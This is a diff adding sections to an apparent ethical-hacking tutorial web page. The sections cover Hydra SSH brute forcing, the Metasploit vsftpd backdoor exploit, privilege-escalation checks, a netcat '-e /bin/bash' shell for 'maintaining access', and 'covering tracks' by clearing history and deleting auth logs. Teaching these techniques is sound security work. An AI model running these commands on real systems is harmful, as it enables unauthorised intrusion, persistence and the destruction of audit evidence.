+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">EH.8</span>
+                        Password Attacks
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Brute Force with Hydra</h3>
+                            <div class="code-block">
+                                <span class="code-label">Create Files</span>
+                                <pre>nano user.txt
+nano pass.txt</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Run Hydra</span>
+                                <pre>hydra -L user.txt -P pass.txt ssh://192.168.1.10</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>Wordlist Attack</h3>
+                            <div class="code-block">
+                                <span class="code-label">John</span>
+                                <pre>john --wordlist=rockyou.txt hashes.txt</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">EH.9</span>
+                        Exploitation Framework (Metasploit)
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Start Metasploit</h3>
+                            <div class="code-block">
+                                <span class="code-label">Launch</span>
+                                <pre>msfconsole</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>Find & Use Exploit</h3>
+                            <div class="code-block">
+                                <span class="code-label">Search</span>
+                                <pre>search vsftpd</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Use</span>
+                                <pre>use exploit/unix/ftp/vsftpd_234_backdoor</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Set Target</span>
+                                <pre>set RHOSTS 192.168.1.10
+run</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">EH.10</span>
+                        Privilege Escalation
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Linux</h3>
+                            <div class="code-block">
+                                <span class="code-label">Sudo Permissions</span>
+                                <pre>sudo -l</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Find SUID Files</span>
+                                <pre>find / -perm -4000 2>/dev/null</pre>
+                            </div>
+                            <p>See SUDO and SUID/SGID sections for detailed exploitation.</p>
+                        </div>
+                        <div class="section">
+                            <h3>Windows</h3>
+                            <div class="code-block">
+                                <span class="code-label">Privileges</span>
+                                <pre>whoami /priv</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">EH.11</span>
+                        Maintaining Access
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Backdoor Creation</h3>
+                            <div class="code-block">
+                                <span class="code-label">Listener</span>
+                                <pre>nc -lvnp 4444</pre>
+                            </div>
+                            <div class="code-block">
+                                <span class="code-label">Connect</span>
+                                <pre>nc TARGET_IP 4444 -e /bin/bash</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">EH.12</span>
+                        Covering Tracks
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>Clear Bash History</h3>
+                            <div class="code-block">
+                                <span class="code-label">History</span>
+                                <pre>history -c</pre>
+                            </div>
+                        </div>
+                        <div class="section">
+                            <h3>Delete Logs</h3>
+                            <div class="code-block">
+                                <span class="code-label">Auth Logs</span>
+                                <pre>rm -rf /var/log/auth.log</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="accordion">
+                <div class="accordion-header">
+                    <div class="accordion-title">
+                        <span class="step-number">EH.13</span>
+                        Reporting (Real-World Important)
+                    </div>
+                    <i class="fas fa-chevron-down accordion-icon"></i>
+                </div>
+                <div class="accordion-content">
+                    <div class="accordion-body">
+                        <div class="section">
+                            <h3>What to Include</h3>
+                            <ul style="margin-left:20px;">
+                                <li>Vulnerability name</li>
+                                <li>Risk level</li>
+                                <li>Proof of concept</li>
+                                <li>Impact</li>
+                                <li>Remediation</li>
+                            </ul>
+                        </div>
+                        <div class="section">
+                            <h3>Final Website Structure (Ready)</h3>
+                            <div class="code-block">
+                                <span class="code-label">Topics</span>
+                                <pre>Ethical Hacking
+├── Introduction
+├── Methodology
+├── Reconnaissance
+├── Scanning
+├── Enumeration
+├── Vulnerability Analysis
+├── Web Attacks
+├── Password Attacks
+├── Exploitation
+├── Privilege Escalation
+├── Maintaining Access
+└── Reporting</pre>
+                            </div>
+                        </div>
                     </div>
                 </div>
             </div>
